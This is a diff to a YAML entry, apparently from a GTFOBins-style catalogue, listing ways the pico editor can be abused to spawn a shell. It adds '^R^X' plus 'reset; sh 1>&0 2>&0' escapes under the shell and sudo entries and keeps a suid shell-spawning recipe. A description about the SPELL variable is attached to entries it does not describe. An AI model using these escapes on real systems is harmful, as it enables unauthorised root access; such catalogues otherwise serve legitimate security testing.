@@ -2,6 +2,11 @@
 functions:
   shell:
     - code: |
+        pico
+        ^R^X
+        reset; sh 1>&0 2>&0
+    - description: The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.
+      code: |
         pico -s /bin/sh
         /bin/sh
         ^T
@@ -13,7 +18,8 @@ functions:
   file-read:
     - code: pico file_to_read
   suid:
-    - code: |
+    - description: The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.
+      code: |
         TF=$(mktemp)
         echo '#!/bin/sh -p
         exec sh -p' > $TF
@@ -22,7 +28,7 @@ functions:
         ^T
   sudo:
     - code: |
-        pico -s /bin/sh
-        /bin/sh
-        ^T
+        sudo pico
+        ^R^X
+        reset; sh 1>&0 2>&0
 ---
